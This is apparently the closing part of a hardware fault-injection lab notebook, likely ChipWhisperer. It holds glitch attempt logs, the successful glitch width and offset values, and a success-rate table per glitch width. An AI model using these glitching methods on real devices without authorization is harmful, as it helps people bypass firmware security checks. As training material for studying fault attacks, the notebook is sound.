# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 49.609375 -21.09375 26
# 🐙actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 49.609375 -20.703125 19
# 🐙actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset

# %% [markdown]
# Let's see where we needed to target for our glitch to work:

# %%
gc.calc(["width", "offset"], "success_rate")
# Out:
# [((19,),
#   {'total': 62,
#    'success': 1,
#    'success_rate': 0.016129032258064516,
#    'reset': 21,
#    'reset_rate': 0.3387096774193548,
#    'normal': 40,
#    'normal_rate': 0.6451612903225806}),
#  ((28,),
#   {'total': 72,
#    'success': 1,
#    'success_rate': 0.013888888888888888,
#    'reset': 49,
#    'reset_rate': 0.6805555555555556,
#    'normal': 22,
#    'normal_rate': 0.3055555555555556}),
#  ((26,),
#   {'total': 77,
#    'success': 1,
#    'success_rate': 0.012987012987012988,
#    'reset': 56,
#    'reset_rate': 0.7272727272727273,
#    'normal': 20,
#    'normal_rate': 0.2597402597402597}),
#  ((31,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 3,
#    'reset_rate': 0.07142857142857142,
#    'normal': 39,
#    'normal_rate': 0.9285714285714286}),
#  ((30,),
#   {'total': 43,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 2,
#    'reset_rate': 0.046511627906976744,
#    'normal': 41,
#    'normal_rate': 0.9534883720930233}),
#  ((29,),
#   {'total': 57,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 17,
#    'reset_rate': 0.2982456140350877,
#    'normal': 40,
#    'normal_rate': 0.7017543859649122}),
#  ((27,),
#   {'total': 63,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 52,
#    'reset_rate': 0.8253968253968254,
#    'normal': 11,
#    'normal_rate': 0.1746031746031746}),
#  ((25,),
#   {'total': 74,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 68,
#    'reset_rate': 0.918918918918919,
#    'normal': 6,
#    'normal_rate': 0.08108108108108109}),
#  ((24,),
#   {'total': 66,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 58,
#    'reset_rate': 0.8787878787878788,
#    'normal': 8,
#    'normal_rate': 0.12121212121212122}),
#  ((23,),
#   {'total': 43,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 28,
#    'reset_rate': 0.6511627906976745,
#    'normal': 15,
#    'normal_rate': 0.3488372093023256}),
#  ((22,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 3,
#    'reset_rate': 0.07142857142857142,
#    'normal': 39,
#    'normal_rate': 0.9285714285714286}),
#  ((21,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 2,
#    'reset_rate': 0.047619047619047616,
#    'normal': 40,
#    'normal_rate': 0.9523809523809523}),
#  ((20,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 1,
#    'reset_rate': 0.023809523809523808,
#    'normal': 41,
#    'normal_rate': 0.9761904761904762}),
#  ((18,),
#   {'total': 79,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 60,
#    'reset_rate': 0.759493670886076,
#    'normal': 19,
#    'normal_rate': 0.24050632911392406}),
#  ((17,),
#   {'total': 74,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 70,
#    'reset_rate': 0.9459459459459459,
#    'normal': 4,
#    'normal_rate': 0.05405405405405406}),
#  ((16,),
#   {'total': 67,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 60,
#    'reset_rate': 0.8955223880597015,
#    'normal': 7,
#    'normal_rate': 0.1044776119402985}),
#  ((15,),
#   {'total': 43,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 29,
#    'reset_rate': 0.6744186046511628,
#    'normal': 14,
#    'normal_rate': 0.32558139534883723}),
#  ((14,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 2,
#    'reset_rate': 0.047619047619047616,
#    'normal': 40,
#    'normal_rate': 0.9523809523809523}),
#  ((13,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 3,
#    'reset_rate': 0.07142857142857142,
#    'normal': 39,
#    'normal_rate': 0.9285714285714286}),
#  ((12,),
#   {'total': 43,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 3,
#    'reset_rate': 0.06976744186046512,
#    'normal': 40,
#    'normal_rate': 0.9302325581395349}),
#  ((11,),
#   {'total': 61,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 21,
#    'reset_rate': 0.3442622950819672,
#    'normal': 40,
#    'normal_rate': 0.6557377049180327}),
#  ((10,),
#   {'total': 78,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 57,
#    'reset_rate': 0.7307692307692307,
#    'normal': 21,
#    'normal_rate': 0.2692307692307692}),
#  ((9,),
#   {'total': 70,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 66,
#    'reset_rate': 0.9428571428571428,
#    'normal': 4,
#    'normal_rate': 0.05714285714285714}),
#  ((8,),
#   {'total': 68,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 55,
#    'reset_rate': 0.8088235294117647,
#    'normal': 13,
#    'normal_rate': 0.19117647058823528}),
#  ((7,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 28,
#    'reset_rate': 0.6666666666666666,
#    'normal': 14,
#    'normal_rate': 0.3333333333333333}),
#  ((6,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 0,
#    'reset_rate': 0.0,
#    'normal': 42,
#    'normal_rate': 1.0}),
#  ((5,),
#   {'total': 42,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 1,
#    'reset_rate': 0.023809523809523808,
#    'normal': 41,
#    'normal_rate': 0.9761904761904762}),
#  ((4,),
#   {'total': 44,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 6,
#    'reset_rate': 0.13636363636363635,
#    'normal': 38,
#    'normal_rate': 0.8636363636363636})]

# %%
scope.dis()
target.dis()

# %%
assert successes >= 1
